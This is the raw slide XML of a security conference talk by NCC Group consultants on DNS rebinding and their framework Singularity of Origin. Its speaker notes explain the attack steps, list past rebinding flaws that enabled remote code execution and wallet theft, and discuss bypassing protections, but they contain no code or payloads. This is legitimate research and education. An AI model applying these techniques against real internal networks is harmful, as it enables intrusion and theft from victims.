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y="5143500" cx="9144000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Inconsolata"/>
      <p:regular r:id="rId83"/>
      <p:bold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66E9546D-B0F6-4F7C-BB34-24EFF5FAE214}">
  <a:tblStyle styleId="{66E9546D-B0F6-4F7C-BB34-24EFF5FAE21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Inconsolata-bold.fntdata"/><Relationship Id="rId83" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Inconsolata-regular.fnt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coinmonks/the-call-is-coming-from-inside-the-house-dns-rebinding-in-eosio-keosd-wallet-e11deae05974"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brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325"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log.hacker.af/how-your-ethereum-can-be-stolen-using-dns-rebinding"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ou.ke/blog/hacking-developers/"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bs.mwrinfosecurity.com/advisories/minikube-rce/"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enmmurphy.github.io/blog/2016/07/11/rails-webconsole-dns-rebinding/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://edgeguides.rubyonrails.org/6_0_release_notes.html#railties-notable-changes"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bs.mwrinfosecurity.com/advisories/minikube-rce/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://medium.com/coinmonks/the-call-is-coming-from-inside-the-house-dns-rebinding-in-eosio-keosd-wallet-e11deae05974" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://benmmurphy.github.io/blog/2016/07/11/rails-webconsole-dns-rebinding/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://bou.ke/blog/hacking-developers/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://bugs.chromium.org/p/project-zero/issues/detail?id=1524" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.hacker.af/how-your-ethereum-can-be-stolen-using-dns-rebinding" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://bugs.chromium.org/p/project-zero/issues/detail?id=1471&amp;desc=3" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://bugs.chromium.org/p/project-zero/issues/detail?id=1447"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cjON0_wTpX8"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thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html"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lnetlabs.nl/documentation/unbound/unbound.conf/"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ugs.chromium.org/p/chromium/issues/detail?id=428046"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XWo-CqSXqdY" TargetMode="Externa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icg.github.io/cors-rfc1918/" TargetMode="Externa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R5Y1luRhjbc" TargetMode="Externa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 we are going to discuss the current state of DNS rebinding including recent attack &amp; prevention techniques. We will discuss our DNS rebinding attack framework named Singularity of Origin and how we incorporated these recent techniques and how you can use them today.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 name="Shape 57"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="Google Shape;58;g5d1b77754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5d1b77754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contributions in the domain of DNS rebinding attacks and defenses are two-fold:</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First, a new tool, Singularity of Origin, that includes all you need to perform DNS rebinding attacks. It is reliable, performant, has built-in payloads to attack common services and can perform automatic service detection and exploitation.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Our second area of contribution is the research in techniques to achieve faster attacks and to bypass common DNS rebinding protections, as implemented by Singularity.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4" name="Shape 64"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Google Shape;65;g5c05a104a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5c05a104a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presentation is articulated around the description of our tool and of the techniques it implements. We will include a customary refresher on the basics of DNS rebinding to boot but also a description of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>our </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HTTP proxy-less architecture to browse the networks of a hooked browser that we implemented in Singularity.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0" name="Shape 70"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Google Shape;71;g5c05a104a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5c05a104a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5" name="Shape 75"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Google Shape;76;g5c05a104a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5c05a104a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are Gerald Doussot and Roger Meyer, security consultants at NCC Group. We are attached to the San Francisco office in California. We are the authors of Singularity of Origin, a DNS rebinding framework</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3" name="Shape 83"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="Google Shape;84;g5c05a104a7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5c05a104a7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 developers understand that binding an HTTP server to all interfaces allows remote attackers to access the web service.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9" name="Shape 89"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Google Shape;90;g5d1b77754d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5d1b77754d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Developers often try to solve this through binding an HTTP server to the localhost only. This prevents remote attackers from accessing the unauthenticated web service as the service only runs on the localhost, right?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5" name="Shape 95"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="Google Shape;96;g5d1e97267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5d1e97267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2018-07-19 EOSIO keosd wallet: steal EOS tokens (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://medium.com/coinmonks/the-call-is-coming-from-inside-the-house-dns-rebinding-in-eosio-keosd-wallet-e11deae05974</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>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1" name="Shape 101"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Google Shape;102;g5d1e97267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5d1e97267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2018-06-19 Google Home, Sonos WiFi Speakers, Roku: play content (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>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8" name="Shape 108"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="Google Shape;109;g5d1e97267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5d1e97267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2018-01-19 Geth: steal Ethereum tokens (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://blog.hacker.af/how-your-ethereum-can-be-stolen-using-dns-rebinding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>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6" name="Shape 116"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="117" name="Google Shape;117;g5d1e97267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5d1e97267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2016-08-02 Elasticsearch, memcached, Redis : steal DB content (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://bou.ke/blog/hacking-developers/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>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5" name="Shape 125"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="126" name="Google Shape;126;g5d1e97267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5d1e97267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2018-10-02 Minikube RCE &amp; VM Escape (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://labs.mwrinfosecurity.com/advisories/minikube-rce/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>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5" name="Shape 135"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="136" name="Google Shape;136;g5d1e97267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5d1e97267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2016-07-11 Rails Web Console: RCE (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://benmmurphy.github.io/blog/2016/07/11/rails-webconsole-dns-rebinding/</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Note:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Ruby on Rails 6.0, released in August 2019, protects against DNS rebinding attacks in its default configuration.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://edgeguides.rubyonrails.org/6_0_release_notes.html#railties-notable-changes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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6" name="Shape 146"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="147" name="Google Shape;147;g5d1b77754d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5d1b77754d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Applications running an HTTP server without authentication is becoming very common with the use of frameworks such as Electron</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The rise of IoT devices will expose more simple web services mostly without authentication to internal networks ready to be exploited.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>There are common misconceptions around how DNS Rebinding works, for example that it is slow and has been fixed a long time ago. We’ll show you that DNS Rebinding is fast (&lt;3s) and that no comprehensive prevention solution is available.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Same Origin Policy is all that is preventing access to the internal network when a victim browses to an attacker controlled site. And DNS Rebinding bypasses this origin.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>DNS Rebinding had several high impact vulnerabilities recently such as cryptocurrency wallets allowing an attacker to steal funds, and RCE allowing attackers to run arbitrary command on the victim’s machine.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2018-10-02 Minikube RCE &amp; VM Escape (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://labs.mwrinfosecurity.com/advisories/minikube-rce/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2018-07-19 EOSIO keosd wallet: steal EOS tokens (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://medium.com/coinmonks/the-call-is-coming-from-inside-the-house-dns-rebinding-in-eosio-keosd-wallet-e11deae05974</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2018-06-19 Google Home, Sonos WiFi Speakers, Roku: play content (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2018-01-31 uTorrent Web: RCE (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://bugs.chromium.org/p/project-zero/issues/detail?id=1524</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2018-01-19 Geth: steal Ethereum tokens (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>https://blog.hacker.af/how-your-ethereum-can-be-stolen-using-dns-rebinding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2017-12-08 Blizzard Update Agent: RCE (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>https://bugs.chromium.org/p/project-zero/issues/detail?id=1471&amp;desc=3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2017-11-30 Transmission BitTorrent client: RCE (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>https://bugs.chromium.org/p/project-zero/issues/detail?id=1447</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2016-08-02 Elasticsearch, memcached, Redis : steal DB content (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>https://bou.ke/blog/hacking-developers/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2016-07-11 Rails Web Console: RCE (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId10"/>
              </a:rPr>
              <a:t>https://benmmurphy.github.io/blog/2016/07/11/rails-webconsole-dns-rebinding/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>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2" name="Shape 152"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="153" name="Google Shape;153;g5c05a104a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5c05a104a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7" name="Shape 157"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Google Shape;158;g5c05a104a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5c05a104a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4" name="Shape 164"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165" name="Google Shape;165;g5c05a104a7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5c05a104a7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0" name="Shape 170"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="171" name="Google Shape;171;g5cfc32ad47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5cfc32ad47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There are 3 actors: victim, attacker, target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Victim (Browser): Firefox</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Target (Vulnerable Web Service): Rails Web Console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Attacker: Singularity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Left side: internal network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Right side: Internet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1" name="Shape 181"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="Google Shape;182;g5cfc32ad47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5cfc32ad47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Victim can access the target server (hosted on the localhost or other internal system) without authentication and target service is vulnerable to DNS rebinding</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4" name="Shape 194"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="195" name="Google Shape;195;g5cfc32ad47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5cfc32ad47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Attacker can’t reach the target server directly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rgbClr val="002060"/>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0" name="Shape 210"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="211" name="Google Shape;211;g5cfc32ad47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5cfc32ad47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Step 1: Victim browses to http://rebind.it/ Victim’s browser makes a DNS request to the attackers DNS server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rgbClr val="002060"/>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0" name="Shape 220"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="221" name="Google Shape;221;g5cfc32ad47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5cfc32ad47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Step 2: The attackers DNS server returns the attacker’s IP address with a low time to live (TTL) forcing the browser to expire the A record quickly. The browser loads the attacker’s HTML/JavaScript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rgbClr val="00206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3" name="Shape 233"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
